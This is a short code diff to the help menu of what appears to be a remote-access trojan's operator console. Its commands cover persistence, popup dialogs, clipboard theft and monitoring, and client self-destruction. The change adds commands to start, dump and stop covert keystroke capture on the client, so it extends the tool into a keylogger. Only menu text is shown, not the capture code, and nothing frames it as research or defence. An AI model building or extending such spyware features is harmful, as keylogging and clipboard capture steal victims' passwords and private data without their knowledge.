@@ -841,10 +841,13 @@ def show_help():
   {C.GREEN}persist{C.RESET}           Re-apply persistence on client
   {C.GREEN}dialog <title> | <msg>{C.RESET}  Show popup dialog on client
 
-  {C.CYAN}Clipboard:{C.RESET}
+  {C.CYAN}Clipboard & Keystrokes:{C.RESET}
   {C.GREEN}clip{C.RESET}              Grab current clipboard text
   {C.GREEN}clipwatch{C.RESET}         Start live clipboard monitor
   {C.GREEN}clipstop{C.RESET}          Stop clipboard monitor
+  {C.GREEN}keystart{C.RESET}          Start keystroke capture on client (in-memory)
+  {C.GREEN}keydump{C.RESET}           Retrieve captured keystrokes (clears buffer)
+  {C.GREEN}keystop{C.RESET}           Stop keystroke capture (buffer stays for keydump)
 
   {C.CYAN}Danger Zone:{C.RESET}
   {C.RED}kill{C.RESET}              Self-destruct client (removes & deletes)
